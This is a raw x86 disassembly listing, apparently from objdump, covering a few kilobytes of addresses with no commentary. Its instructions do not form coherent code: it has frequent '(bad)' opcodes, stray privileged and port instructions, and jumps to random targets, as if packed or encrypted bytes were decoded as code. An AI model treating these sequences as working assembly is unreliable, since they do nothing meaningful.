  41e448:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e449:	jg     0x41e476
  41e44b:	aas    
  41e44c:	inc    ecx
  41e44d:	loope  0x41e4ac
  41e44f:	and    BYTE PTR [eax],dl
  41e451:	mov    BYTE PTR [edx],bl
  41e453:	out    0x21,eax
  41e455:	xchg   ecx,eax
  41e456:	xchg   edi,eax
  41e457:	ss aam 0x6a
  41e45a:	sbb    DWORD PTR [edi-0x196ea554],0x33f3e14a
  41e464:	jecxz  0x41e492
  41e466:	sbb    BYTE PTR [edi-0x797aa3b4],cl
  41e46c:	mov    al,0xe6
  41e46e:	mov    eax,0x1a4a35d9
  41e473:	stc    
  41e474:	pop    esi
  41e475:	jns    0x41e3ff
  41e477:	ss bnd jle 0x41e471
  41e47b:	xchg   edi,eax
  41e47c:	stos   BYTE PTR es:[edi],al
  41e47d:	retf   0x7870
  41e480:	sub    dh,dl
  41e482:	test   ch,cl
  41e484:	int    0x59
  41e486:	mov    ds:0xcc5b57f3,eax
  41e48b:	lds    edi,FWORD PTR [edi-0x7b9689dd]
  41e491:	mov    edx,0x927d70a4
  41e496:	daa    
  41e497:	jae    0x41e50c
  41e499:	cmp    ebx,DWORD PTR [esi+0x70]
  41e49c:	test   DWORD PTR [esi+0x0],ecx
  41e49f:	dec    ebx
  41e4a0:	sub    al,0x86
  41e4a2:	jl     0x41e4d1
  41e4a4:	sub    al,0xd6
  41e4a6:	dec    ecx
  41e4a7:	sar    DWORD PTR [ebp+0x74a5e0a6],cl
  41e4ad:	xchg   ecx,eax
  41e4ae:	dec    eax
  41e4af:	popaw  
  41e4b1:	and    dl,BYTE PTR [edx]
  41e4b3:	and    DWORD PTR [ebx],eax
  41e4b5:	xor    al,ah
  41e4b7:	mov    ah,0xff
  41e4b9:	inc    ebx
  41e4ba:	adc    al,0xd
  41e4bc:	xchg   esi,eax
  41e4bd:	stos   DWORD PTR es:[edi],eax
  41e4be:	cwde   
  41e4bf:	and    al,0x3d
  41e4c1:	cmp    eax,0x219d0b25
  41e4c6:	inc    esp
  41e4c7:	sbb    si,WORD PTR [eax+edi*1+0x576feba0]
  41e4cf:	sub    eax,0x63b0d55f
  41e4d4:	ror    DWORD PTR [ebx+eiz*1-0x17],1
  41e4d8:	dec    ecx
  41e4d9:	icebp  
  41e4da:	xchg   edx,eax
  41e4db:	push   cs
  41e4dc:	mov    dh,BYTE PTR [ebx-0x1273488]
  41e4e2:	cmp    DWORD PTR ds:0x131d9335,ebp
  41e4e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4e9:	ins    DWORD PTR es:[edi],dx
  41e4ea:	inc    esp
  41e4eb:	cmp    esi,DWORD PTR ds:0x815eb6ae
  41e4f1:	mov    ebx,0xe79a2710
  41e4f6:	ret    
  41e4f7:	inc    ecx
  41e4f8:	add    DWORD PTR ds:[edi],ebp
  41e4fb:	stos   BYTE PTR es:[edi],al
  41e4fc:	and    esi,DWORD PTR [ebp+0x7c0f5884]
  41e502:	xor    eax,DWORD PTR [esp+ecx*4]
  41e505:	in     eax,dx
  41e506:	shl    BYTE PTR [ebx],1
  41e508:	mov    DWORD PTR [ebx],esp
  41e50a:	mov    BYTE PTR [ebp-0x52],cl
  41e50d:	pop    esp
  41e50e:	and    eax,esp
  41e510:	ja     0x41e4ed
  41e512:	add    bh,0xcf
  41e515:	ins    DWORD PTR es:[edi],dx
  41e516:	cdq    
  41e517:	xlat   BYTE PTR ds:[ebx]
  41e518:	or     eax,0x26e7620b
  41e51d:	cld    
  41e51e:	lods   eax,DWORD PTR ds:[esi]
  41e51f:	ins    BYTE PTR es:[edi],dx
  41e520:	add    DWORD PTR [edx+0x3b],0x1c
  41e524:	into   
  41e525:	dec    ebx
  41e526:	add    cl,al
  41e528:	popf   
  41e529:	mov    esi,0x16eee2eb
  41e52e:	pop    ebx
  41e52f:	xchg   DWORD PTR [eax+0x7dd6d17f],ecx
  41e535:	pop    esi
  41e536:	add    BYTE PTR [eax],ch
  41e538:	inc    ecx
  41e539:	ret    0x47f6
  41e53c:	sbb    dl,BYTE PTR [ebx]
  41e53e:	hlt    
  41e53f:	adc    al,0xf3
  41e541:	pop    eax
  41e542:	push   ss
  41e543:	mov    al,BYTE PTR [ebx]
  41e545:	pop    DWORD PTR [ebx-0x365846bf]
  41e54b:	cs push edi
  41e54d:	(bad)  
  41e54f:	mov    ecx,0x4e09771c
  41e554:	lahf   
  41e555:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e556:	fwait
  41e557:	jno    0x41e566
  41e559:	jbe    0x41e5bc
  41e55b:	jle    0x41e5cd
  41e55d:	xchg   esi,eax
  41e55e:	shr    BYTE PTR ds:0xb2bc7d3,1
  41e564:	mov    ebp,0x450b88ba
  41e569:	push   ds
  41e56a:	jns    0x41e575
  41e56c:	hlt    
  41e56d:	inc    edi
  41e56e:	xor    al,BYTE PTR [ebx-0x6fa05c47]
  41e574:	loop   0x41e54c
  41e576:	xchg   ebx,eax
  41e577:	push   0x6a797f8b
  41e57c:	jbe    0x41e5e7
  41e57e:	add    BYTE PTR [ecx+0x3ef4cb23],0xdc
  41e585:	pushf  
  41e586:	mov    esp,0x1b92b3dc
  41e58b:	add    BYTE PTR [ebp+0x4766727f],al
  41e591:	sub    eax,0xaa66cc1b
  41e596:	xor    al,BYTE PTR [edi-0x59]
  41e599:	mov    cl,0x37
  41e59b:	push   es
  41e59c:	mov    esi,0xea1d55a4
  41e5a1:	(bad)  
  41e5a2:	mov    ecx,0xa1f4cec9
  41e5a7:	mov    dl,0xfe
  41e5a9:	jp     0x41e533
  41e5ab:	out    0xe5,eax
  41e5ad:	mov    esi,DWORD PTR [edi]
  41e5af:	xchg   ebp,eax
  41e5b0:	mov    ebx,0xae666fdd
  41e5b5:	cmp    al,0xfe
  41e5b7:	ja     0x41e5d5
  41e5b9:	std    
  41e5ba:	adc    DWORD PTR [ebx+edi*4],ecx
  41e5bd:	ins    DWORD PTR es:[edi],dx
  41e5be:	test   ecx,ebp
  41e5c0:	cs mov esp,cr4
  41e5c4:	in     al,0x49
  41e5c6:	stos   DWORD PTR es:[edi],eax
  41e5c7:	out    0xa2,al
  41e5c9:	inc    ecx
  41e5ca:	repnz jmp 0x8e46:0xa65bb471
  41e5d2:	xchg   esp,eax
  41e5d3:	arpl   WORD PTR [edx+eax*2-0x4],bp
  41e5d7:	adc    BYTE PTR [edx],cl
  41e5d9:	rol    DWORD PTR [edx+0x7197c136],cl
  41e5df:	push   0xffffffeb
  41e5e1:	mov    WORD PTR [ebx],ds
  41e5e3:	cli    
  41e5e4:	pop    ss
  41e5e5:	fist   DWORD PTR fs:[esi]
  41e5e8:	pop    es
  41e5e9:	or     eax,0x8b8f0e1f
  41e5ee:	jae    0x41e5ce
  41e5f0:	mov    bl,0x24
  41e5f2:	data16 cmp BYTE PTR [ebx],ch
  41e5f5:	mov    bh,0xfc
  41e5f7:	xor    ebp,ebp
  41e5f9:	mov    edi,0x61bd4f36
  41e5fe:	sbb    edi,DWORD PTR [ebx+0x70]
  41e601:	jge    0x41e65b
  41e603:	add    DWORD PTR [ecx],esp
  41e605:	adc    al,0x90
  41e607:	test   al,0x93
  41e609:	fstp   DWORD PTR [ecx+ecx*4+0x14]
  41e60d:	cld    
  41e60e:	jmp    0x41e681
  41e610:	pop    ebp
  41e611:	fnsave [edx]
  41e613:	inc    ebx
  41e614:	dec    edx
  41e615:	xor    ch,BYTE PTR [esi-0x45abe650]
  41e61b:	pop    ecx
  41e61c:	pop    edx
  41e61d:	adc    al,0x2a
  41e61f:	mov    cl,0xa1
  41e621:	pop    ds
  41e622:	into   
  41e623:	mov    ds:0xaef0bfed,al
  41e628:	call   0xf30b:0x50d392e5
  41e62f:	psubw  mm5,mm3
  41e632:	sti    
  41e633:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e634:	sbb    BYTE PTR [ebp+0x34],cl
  41e637:	mov    eax,edi
  41e639:	cmp    eax,0x210887a4
  41e63e:	dec    al
  41e640:	cs pop edi
  41e642:	mov    ch,0xb1
  41e644:	or     eax,0x3a29dc9b
  41e649:	repz dec ebx
  41e64b:	jbe    0x41e665
  41e64d:	dec    esi
  41e64e:	pop    esi
  41e64f:	popf   
  41e650:	cwde   
  41e651:	icebp  
  41e652:	xor    dl,cl
  41e654:	enter  0xe269,0x20
  41e658:	(bad)  
  41e659:	out    dx,eax
  41e65a:	mov    cl,0xdb
  41e65c:	nop
  41e65d:	sub    ebp,DWORD PTR [ecx-0x7a]
  41e660:	xchg   ecx,eax
  41e661:	ret    
  41e662:	daa    
  41e663:	loopne 0x41e65b
  41e665:	xor    ch,bl
  41e667:	mov    al,ds:0x4a9ec0e4
  41e66c:	lock pop ebx
  41e66e:	ffree  st(5)
  41e670:	inc    BYTE PTR [eax]
  41e672:	jo     0x41e6ad
  41e674:	and    eax,0x9495e701
  41e679:	rcr    dl,cl
  41e67b:	mov    edx,DWORD PTR [ebp+0x74c31a8f]
  41e681:	into   
  41e682:	dec    esp
  41e683:	dec    edx
  41e684:	enter  0xc575,0x5e
  41e688:	jns    0x41e65d
  41e68a:	mov    dh,0x40
  41e68c:	mov    ebp,0x29ff3a2e
  41e691:	adc    eax,0x54a5efed
  41e696:	int    0xa
  41e698:	adc    eax,0x42b7c5b0
  41e69d:	ins    BYTE PTR es:[edi],dx
  41e69e:	jne    0x41e69b
  41e6a0:	dec    ebx
  41e6a1:	scas   al,BYTE PTR es:[edi]
  41e6a2:	push   es
  41e6a3:	push   ss
  41e6a4:	mov    edi,0xc2c252b1
  41e6a9:	push   0xffffffc0
  41e6ab:	aad    0xa0
  41e6ad:	adc    al,0xda
  41e6af:	(bad)  
  41e6b0:	mov    dl,0x26
  41e6b2:	dec    edx
  41e6b3:	(bad)
  41e6b6:	mov    esp,0x9d5626be
  41e6bb:	dec    edx
  41e6bc:	sbb    DWORD PTR [ecx+esi*2+0x6a1a1c15],0x4d
  41e6c4:	inc    ebx
  41e6c5:	fcom   DWORD PTR [ebx+0x57]
  41e6c8:	sub    DWORD PTR [edi+eax*8+0x49],0xfffffffc
  41e6cd:	xchg   BYTE PTR [ecx+ebx*2+0x580f0c58],bl
  41e6d4:	mov    esi,0x4d8ccb2f
  41e6d9:	inc    ebx
  41e6da:	cmp    esi,DWORD PTR [ecx*8-0x96bdba3]
  41e6e1:	xchg   ebp,eax
  41e6e2:	dec    eax
  41e6e3:	mov    BYTE PTR [edx-0x30526790],cl
  41e6e9:	test   eax,0x6e2ec5f8
  41e6ee:	xchg   BYTE PTR [edi-0x41],ch
  41e6f1:	adc    BYTE PTR [eax-0x6b],dl
  41e6f4:	mov    ebx,0x219130
  41e6f9:	ins    BYTE PTR es:[edi],dx
  41e6fa:	pop    es
  41e6fb:	mov    esp,DWORD PTR [edi-0x2e]
  41e6fe:	imul   esp,ebx,0x1c
  41e701:	ror    DWORD PTR [edi-0x49],cl
  41e704:	outs   dx,DWORD PTR ds:[esi]
  41e705:	sbb    eax,0xd448ebb1
  41e70a:	add    bh,BYTE PTR [esi+0x76]
  41e70d:	mul    edx
  41e70f:	or     eax,0xba18db49
  41e714:	(bad)  
  41e715:	lods   al,BYTE PTR ds:[esi]
  41e716:	std    
  41e717:	retf   
  41e718:	icebp  
  41e719:	inc    ebx
  41e71a:	sub    eax,0xc01daa09
  41e71f:	jns    0x41e6e6
  41e721:	scas   eax,DWORD PTR es:[edi]
  41e722:	cmp    bh,BYTE PTR [esi+ebx*8]
  41e725:	jnp    0x41e7a6
  41e727:	nop
  41e728:	xchg   ebx,eax
  41e72a:	cli    
  41e72b:	jne    0x41e71a
  41e72d:	repz inc esp
  41e72f:	mov    esi,0x3128d5a9
  41e734:	xor    eax,0x898cf482
  41e739:	xchg   ebp,eax
  41e73a:	xchg   esi,eax
  41e73b:	mov    dh,0x50
  41e73d:	pop    eax
  41e73e:	dec    esp
  41e73f:	and    al,0xe
  41e741:	mov    dl,0xa5
  41e743:	sar    BYTE PTR [eax+0x4708f228],0x23
  41e74a:	push   edi
  41e74b:	lods   eax,DWORD PTR ds:[esi]
  41e74c:	ins    DWORD PTR es:[edi],dx
  41e74d:	mov    eax,0xe85bbd7a
  41e752:	cmp    esi,esi
  41e754:	repz aas 
  41e756:	mov    ebp,0xd0982292
  41e75b:	ja     0x41e7c0
  41e75d:	mov    al,ds:0xc628a148
  41e762:	mov    ebp,0xd3925523
  41e767:	sar    DWORD PTR [ebx+0x796ae475],1
  41e76d:	test   al,0x21
  41e76f:	ja     0x41e74e
  41e771:	jl     0x41e740
  41e773:	hlt    
  41e774:	jae    0x41e771
  41e776:	add    DWORD PTR [eax+0x735c070a],ecx
  41e77c:	hlt    
  41e77d:	mov    esp,0xb4d8544e
  41e782:	xor    cl,BYTE PTR ds:0x40c46b5e
  41e788:	cmp    al,0xa9
  41e78a:	cs das 
  41e78c:	or     BYTE PTR [ebx-0x6d],al
  41e78f:	shr    BYTE PTR [ecx+0x3556aa07],cl
  41e795:	cmp    al,0x9b
  41e797:	(bad)  
  41e798:	jg     0x41e7f2
  41e79a:	push   esp
  41e79b:	push   0x7f1b683d
  41e7a0:	sar    DWORD PTR [esp+edi*4+0x26d809ac],0x13
  41e7a8:	sub    BYTE PTR [esi+0x61f82238],bh
  41e7ae:	add    al,0xea
  41e7b0:	lods   al,BYTE PTR ds:[esi]
  41e7b1:	jmp    0x41e78e
  41e7b3:	nop
  41e7b4:	inc    eax
  41e7b5:	(bad)
  41e7b8:	imul   esi,DWORD PTR [ebx-0x78],0x85be983e
  41e7bf:	pop    ds
  41e7c0:	xchg   ebp,eax
  41e7c1:	mov    al,0x70
  41e7c3:	jbe    0x41e7da
  41e7c5:	inc    edi
  41e7c6:	lods   eax,DWORD PTR ds:[esi]
  41e7c7:	aad    0x79
  41e7c9:	dec    esp
  41e7ca:	or     ebx,edi
  41e7cc:	inc    edi
  41e7cd:	push   ebp
  41e7ce:	shl    DWORD PTR [esp+ebx*4],0x54
  41e7d2:	jne    0x41e7b8
  41e7d4:	add    al,0xac
  41e7d6:	call   0x28771b65
  41e7db:	mov    dl,0x16
  41e7dd:	out    dx,al
  41e7de:	(bad)  
  41e7df:	mov    edx,0xb0733e79
  41e7e4:	aas    
  41e7e5:	cmp    BYTE PTR [esi],0x16
  41e7e8:	sub    ah,0x39
  41e7eb:	mov    BYTE PTR [eax],bh
  41e7ed:	ss inc esp
  41e7ef:	das    
  41e7f0:	cld    
  41e7f1:	adc    eax,0xb4a611a2
  41e7f6:	in     eax,0x8b
  41e7f8:	fcomp  QWORD PTR [ebp+eax*8+0x4e06614a]
  41e7ff:	sbb    bl,BYTE PTR [edx+0x5bb455a7]
  41e805:	test   BYTE PTR [ecx+eax*8+0x3fe85753],bh
  41e80c:	jno    0x41e80d
  41e80e:	dec    DWORD PTR [ebx-0x2274b]
  41e814:	(bad)  
  41e815:	cmp    esi,eax
  41e817:	jmp    0x41ebfe
  41e81c:	mov    dh,0x8
  41e81e:	xor    al,0xa5
  41e820:	mov    ah,0xb9
  41e822:	mov    esp,0xddc4c918
  41e827:	nop
  41e828:	xlat   BYTE PTR ds:[ebx]
  41e829:	xor    cl,ah
  41e82b:	nop
  41e82c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e82d:	outs   dx,DWORD PTR ds:[esi]
  41e82e:	sar    BYTE PTR [esi-0x41413bb6],0xf0
  41e835:	scas   eax,DWORD PTR es:[edi]
  41e836:	push   ebp
  41e837:	les    esi,FWORD PTR [edi+0x2b]
  41e83a:	xchg   DWORD PTR [ebp+0x48],ecx
  41e83d:	ret    
  41e83e:	adc    cl,BYTE PTR [edi-0x5b]
  41e841:	das    
  41e842:	mov    bl,0x57
  41e844:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e845:	sub    eax,0x6c2602b0
  41e84a:	push   edx
  41e84b:	sbb    eax,0x7c88f946
  41e850:	dec    dh
  41e852:	jne    0x41e7e7
  41e854:	inc    esp
  41e855:	out    dx,al
  41e856:	or     dl,BYTE PTR [ecx]
  41e858:	inc    edx
  41e859:	jmp    0x41e805
  41e85b:	std    
  41e85c:	into   
  41e85d:	xor    eax,0x78387efc
  41e862:	(bad)  
  41e863:	loopne 0x41e8ce
  41e865:	or     DWORD PTR [esi],eax
  41e867:	jmp    DWORD PTR [ecx-0x286438bc]
  41e86d:	push   cs
  41e86e:	les    ebp,FWORD PTR [edx]
  41e870:	stc    
  41e871:	mov    edi,0x372d3c7d
  41e876:	push   ebx
  41e877:	jns    0x41e8ce
  41e879:	ja     0x41e8f5
  41e87b:	pushf  
  41e87c:	push   edi
  41e87d:	xchg   edx,eax
  41e87e:	arpl   WORD PTR [eax],bp
  41e880:	test   al,0x20
  41e882:	fisub  DWORD PTR [edx-0x1e]
  41e885:	jae    0x41e8eb
  41e887:	fisub  DWORD PTR [ebx+0x7c]
  41e88a:	mov    dl,BYTE PTR [ecx-0x7f]
  41e88d:	mov    dh,0xb1
  41e88f:	or     eax,0xdd9a1615
  41e894:	add    dl,BYTE PTR ds:0x574ab786
  41e89a:	mov    ebx,0x12c6294f
  41e89f:	jge    0x41e876
  41e8a1:	jne    0x41e909
  41e8a3:	mov    ds:0x6ac75fef,al
  41e8a8:	icebp  
  41e8a9:	xor    DWORD PTR [ecx],ecx
  41e8ab:	xor    dl,BYTE PTR [ebp-0x6b]
  41e8ae:	stos   DWORD PTR es:[edi],eax
  41e8af:	(bad)
  41e8b2:	push   0xec0937a4
  41e8b7:	cli    
  41e8b8:	cmp    edx,eax
  41e8ba:	mov    bl,al
  41e8bc:	sub    DWORD PTR [esi-0x6e9796cd],0x57
  41e8c3:	sub    eax,0x830c134c
  41e8c8:	add    ecx,ebp
  41e8ca:	imul   DWORD PTR [edi+0x1f]
  41e8cd:	(bad)  
  41e8ce:	(bad)  
  41e8cf:	in     eax,dx
  41e8d0:	xchg   BYTE PTR [esp],al
  41e8d3:	sbb    esi,DWORD PTR [ebp-0x2b5d0e51]
  41e8d9:	cmp    eax,0xde6fb76f
  41e8de:	push   0x11
  41e8e0:	dec    esi
  41e8e1:	retf   0x755c
  41e8e4:	in     al,0xf7
  41e8e6:	les    ebp,FWORD PTR [edx+0x29d24c53]
  41e8ec:	lock inc esp
  41e8ee:	dec    ebp
  41e8ef:	mov    ecx,DWORD PTR [eax]
  41e8f1:	rol    DWORD PTR [esi-0x398ac7fc],0x23
  41e8f8:	popf   
  41e8f9:	(bad)  
  41e8fa:	(bad)  
  41e8fb:	sub    ebx,esi
  41e8fd:	dec    edx
  41e8fe:	idiv   DWORD PTR gs:[ebx]
  41e901:	mov    ebx,0xb5a710ee
  41e906:	and    ch,BYTE PTR [eax-0x51]
  41e909:	test   bl,al
  41e90b:	sub    edx,DWORD PTR [ebx-0x10]
  41e90e:	xchg   ebp,eax
  41e90f:	sbb    BYTE PTR [ebx-0x57],ch
  41e912:	adc    DWORD PTR [ecx-0x3c],ecx
  41e915:	pop    ecx
  41e916:	jo     0x41e960
  41e918:	or     ah,BYTE PTR [edx]
  41e91a:	lods   eax,DWORD PTR ds:[esi]
  41e91b:	push   ebp
  41e91c:	pop    es
  41e91d:	jl     0x41e923
  41e91f:	inc    ecx
  41e920:	into   
  41e921:	dec    esp
  41e922:	pop    edi
  41e923:	(bad)  
  41e924:	js     0x41e8df
  41e926:	xchg   esp,eax
  41e927:	(bad)  
  41e928:	mov    ebx,0x6695f3b4
  41e92d:	add    bl,cl
  41e92f:	data16 lock jnp 0x41e8c5
  41e933:	test   al,0xea
  41e935:	sub    BYTE PTR [esi-0x65],dh
  41e938:	outs   dx,BYTE PTR ds:[esi]
  41e939:	adc    DWORD PTR [edi],esp
  41e93b:	rcr    al,0xec
  41e93e:	sub    edx,DWORD PTR [edx-0x60]
  41e941:	mov    dh,0xbe
  41e943:	jmp    0xb6711aa6
  41e948:	and    eax,0x25798236
  41e94d:	cmp    eax,0x16c6c3f
  41e952:	xchg   ebp,eax
  41e953:	mov    ds:0xb89d3f52,al
  41e958:	test   BYTE PTR [esi+0x10],0x74
  41e95c:	sahf   
  41e95d:	sub    ebx,esp
  41e95f:	jbe    0x41e9c8
  41e961:	pop    ebx
  41e962:	pop    es
  41e963:	xor    BYTE PTR [edi+edx*8],ch
  41e966:	dec    ebp
  41e967:	enter  0x6d08,0x8a
  41e96b:	fs fs push 0x802c348c
  41e972:	pop    ds
  41e973:	mov    ss,ebx
  41e975:	ror    BYTE PTR [ecx+0x3a],0x18
  41e979:	jmp    0x41e919
  41e97b:	retf   
  41e97c:	xor    ch,al
  41e97e:	lds    ecx,FWORD PTR [ebx+0x3e]
  41e981:	cmp    DWORD PTR [ebx+0x27c7478a],esi
  41e987:	ds stc 
  41e989:	push   ss
  41e98a:	xchg   ebx,eax
  41e98b:	sbb    al,0x29
  41e98d:	jne    0x41e945
  41e98f:	push   esi
  41e990:	leave  
  41e991:	adc    BYTE PTR [ecx-0x442fd708],dh
  41e997:	in     eax,0x3e
  41e999:	loopne 0x41e98e
  41e99b:	adc    ah,BYTE PTR [edx]
  41e99d:	and    eax,0xe9a52045
  41e9a2:	jl     0x41e975
  41e9a4:	fs das 
  41e9a6:	mov    al,0xa4
  41e9a8:	into   
  41e9a9:	mov    ebp,0xcb53afb8
  41e9ae:	ins    BYTE PTR es:[edi],dx
  41e9af:	daa    
  41e9b0:	mov    ch,0xc3
  41e9b2:	lock fistp QWORD PTR [edi+0x12]
  41e9b6:	adc    al,ah
  41e9b8:	adc    al,0x68
  41e9ba:	add    edi,esp
  41e9bc:	mov    BYTE PTR gs:[esi-0x77],al
  41e9c0:	lahf   
  41e9c1:	and    al,0x50
  41e9c3:	cmp    edi,DWORD PTR [edx]
  41e9c5:	retf   0x104c
  41e9c8:	xchg   ecx,eax
  41e9c9:	retf   0xe27
  41e9cc:	dec    esi
  41e9cd:	dec    edi
  41e9ce:	jbe    0x41e9c3
  41e9d0:	bound  esi,QWORD PTR [eax-0x5079762d]
  41e9d6:	add    DWORD PTR [edi-0x32],ebx
  41e9d9:	mov    edx,0xf881b539
  41e9de:	cmp    dl,BYTE PTR [ecx+0x62324f7b]
  41e9e4:	cmp    al,0x4c
  41e9e6:	gs xor ebp,edi
  41e9e9:	mov    WORD PTR [eax+0x74],?
  41e9ec:	retf   0xa21
  41e9ef:	xchg   esi,eax
  41e9f0:	gs mov esp,0x3dfa68bf
  41e9f6:	dec    ecx
  41e9f7:	pop    es
  41e9f8:	lea    ebx,[eax-0x429aaec4]
  41e9fe:	xor    eax,0xdfcb14a9
  41ea03:	xor    esi,ecx
  41ea05:	ret    0xa8
  41ea08:	imul   esi,esi,0xffffffff
  41ea0b:	repz adc eax,0x51133bf9
  41ea11:	fsub   QWORD PTR [edi+0xea098b6]
  41ea17:	jb     0x41e9fc
  41ea19:	dec    esi
  41ea1a:	aas    
  41ea1b:	adc    ecx,ecx
  41ea1d:	in     eax,0x83
  41ea1f:	adc    edx,edi
  41ea21:	addr16 hlt 
  41ea23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea24:	xchg   ebp,eax
  41ea25:	out    0xa5,eax
  41ea27:	test   ecx,eax
  41ea29:	cdq    
  41ea2a:	popf   
  41ea2b:	loope  0x41ea9c
  41ea2d:	inc    BYTE PTR [edx-0x2e]
  41ea30:	xchg   ebx,eax
  41ea31:	mov    al,ds:0xf64de3dc
  41ea36:	js     0x41ea19
  41ea38:	aas    
  41ea39:	inc    ecx
  41ea3a:	fisubr WORD PTR [ebp+0x7ebac264]
  41ea40:	(bad)  
  41ea41:	ins    BYTE PTR es:[edi],dx
  41ea42:	imul   ecx,DWORD PTR [eax-0x6db57fc3],0x9e5f7be8
  41ea4c:	je     0x41ea1c
  41ea4e:	cs xchg ecx,eax
  41ea50:	jno    0x41e9f3
  41ea52:	mov    ecx,0x267de187
  41ea57:	shl    DWORD PTR [ecx-0x28],cl
  41ea5a:	lods   al,BYTE PTR ds:[esi]
  41ea5b:	(bad)  
  41ea5c:	or     eax,0xa07e7257
  41ea61:	pop    edi
  41ea62:	lods   eax,DWORD PTR ds:[esi]
  41ea63:	push   ebp
  41ea64:	popf   
  41ea65:	(bad)  
  41ea66:	inc    edx
  41ea67:	dec    esi
  41ea68:	mov    al,ds:0x62b947b8
  41ea6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea6e:	add    eax,0xbb91b9dc
  41ea73:	je     0x41ea45
  41ea75:	pop    ds
  41ea76:	mov    DWORD PTR [ebx],ebp
  41ea78:	sub    edx,DWORD PTR [ebx+0x32]
  41ea7b:	sbb    ecx,0x56
  41ea7e:	and    cl,BYTE PTR [edx-0x22671679]
  41ea84:	pop    esp
  41ea85:	fwait
  41ea86:	or     DWORD PTR [eax-0x6c],ecx
  41ea89:	pusha  
  41ea8a:	test   eax,0x44aebd00
  41ea8f:	into   
  41ea90:	adc    BYTE PTR [edi+0x74efd61e],dh
  41ea96:	add    ecx,ebx
  41ea98:	ss dec edi
  41ea9a:	dec    DWORD PTR [esp+edi*4]
  41ea9d:	sbb    al,0xd4
  41ea9f:	bound  edi,QWORD PTR [ecx+ebx*2-0x3481117f]
  41eaa6:	adc    bl,BYTE PTR [ebp+eiz*1+0x32]
  41eaaa:	push   ss
  41eaab:	mov    ecx,0xcdd97848
  41eab0:	xchg   esp,eax
  41eab1:	add    DWORD PTR [ebx+ebx*4-0x10],ebp
  41eab5:	pop    esi
  41eab6:	pop    ecx
  41eab7:	int3   
  41eab8:	and    al,0xb7
  41eaba:	add    DWORD PTR [eax-0x1803ad81],0xffffffa1
  41eac1:	ret    0xade2
  41eac4:	mov    bh,0x17
  41eac6:	adc    DWORD PTR [edi+0x27],esi
  41eac9:	xchg   ecx,eax
  41eaca:	xchg   edx,eax
  41eacb:	push   ss
  41eacc:	pushf  
  41eacd:	jmp    0xb46a80c1
  41ead2:	push   ds
  41ead3:	mov    cl,BYTE PTR [ebp-0x64]
  41ead6:	pop    eax
  41ead7:	in     eax,dx
  41ead8:	repnz xor cl,BYTE PTR [ebp+0x6b94ff39]
  41eadf:	dec    edx
  41eae0:	sub    DWORD PTR [esi-0x7d250039],esp
  41eae6:	sbb    al,ch
  41eae8:	xor    DWORD PTR [esi+edi*2],0x42bf38bd
  41eaef:	pop    edi
  41eaf0:	sub    BYTE PTR [ebx+0x72852e8f],0x88
  41eaf7:	sub    al,cl
  41eaf9:	call   0xb54:0x7d7599cd
  41eb00:	popf   
  41eb01:	pop    ebx
  41eb02:	mov    al,0xa6
  41eb04:	sar    BYTE PTR [edx+0x54f48b5c],1
  41eb0a:	xchg   esi,eax
  41eb0b:	pop    eax
  41eb0c:	in     eax,0xc4
  41eb0e:	push   ecx
  41eb0f:	ins    BYTE PTR es:[edi],dx
  41eb10:	mov    esi,0x496dd1d8
  41eb15:	push   edx
  41eb16:	inc    ebx
  41eb17:	nop
  41eb18:	call   0xf0fcd4d7
  41eb1d:	mov    bh,0xf2
  41eb1f:	xor    eax,0xcb3aabea
  41eb24:	add    eax,0x991edd0b
  41eb29:	popf   
  41eb2a:	cmp    esp,ebx
  41eb2c:	pop    ss
  41eb2d:	mov    DWORD PTR [eax],ecx
  41eb2f:	or     eax,0x9b12333f
  41eb34:	and    ch,cl
  41eb36:	ret    
  41eb37:	(bad)  
  41eb38:	jb     0x41eac2
  41eb3a:	inc    edx
  41eb3b:	sbb    eax,0x7774d3a9
  41eb40:	pushf  
  41eb41:	test   al,0x57
  41eb43:	enter  0x8b49,0xe6
  41eb47:	adc    eax,0xd12abada
  41eb4c:	xchg   ecx,eax
  41eb4d:	retf   0xc8d
  41eb50:	fwait
  41eb51:	je     0x41eb79
  41eb53:	inc    edi
  41eb54:	sahf   
  41eb55:	sbb    BYTE PTR [eax-0x66f277b3],0xb2
  41eb5c:	dec    edi
  41eb5d:	imul   edi,DWORD PTR [ebx-0x6b],0xa3925858
  41eb64:	push   esi
  41eb65:	add    bh,bl
  41eb67:	mov    ebx,DWORD PTR [eax-0x2c74f117]
  41eb6d:	mov    dh,0x29
  41eb6f:	jno    0x41eb2a
  41eb71:	je     0x41eb23
  41eb73:	cmc    
  41eb74:	in     eax,0xa8
  41eb76:	jbe    0x41ebb9
  41eb78:	ins    BYTE PTR es:[edi],dx
  41eb79:	lock xchg edx,eax
  41eb7b:	push   ds
  41eb7c:	lods   eax,DWORD PTR ds:[esi]
  41eb7d:	sbb    esp,DWORD PTR [edx]
  41eb7f:	out    dx,al
  41eb80:	ins    BYTE PTR es:[edi],dx
  41eb81:	push   ds
  41eb82:	add    dh,BYTE PTR [edi-0x5e9242db]
  41eb88:	xchg   ecx,eax
  41eb89:	(bad)  
  41eb8a:	fldcw  WORD PTR [edi-0x70]
  41eb8d:	rcr    DWORD PTR [ecx-0x331b8a88],0xde
  41eb94:	sbb    ebp,edi
  41eb96:	push   0x1e556416
  41eb9b:	cmp    al,0xdb
  41eb9d:	and    ch,BYTE PTR fs:[ecx]
  41eba0:	jl     0x41eb6e
  41eba2:	mov    ah,BYTE PTR [esi+0x7f0a97cc]
  41eba8:	das    
  41eba9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebaa:	sub    DWORD PTR [ebp+edi*2-0x2dacfbcd],0x69
  41ebb2:	sub    BYTE PTR [edi-0x78],dl
  41ebb5:	xchg   ebp,eax
  41ebb6:	out    dx,al
  41ebb7:	or     BYTE PTR [edi*8+0x11f9696a],cl
  41ebbe:	pop    es
  41ebbf:	push   ebp
  41ebc0:	add    eax,0x4ec8e0dd
  41ebc5:	and    ebx,esi
  41ebc7:	pop    ebp
  41ebc8:	and    BYTE PTR [edx],bl
  41ebca:	mov    eax,0xdaddfd75
  41ebcf:	mov    ch,dl
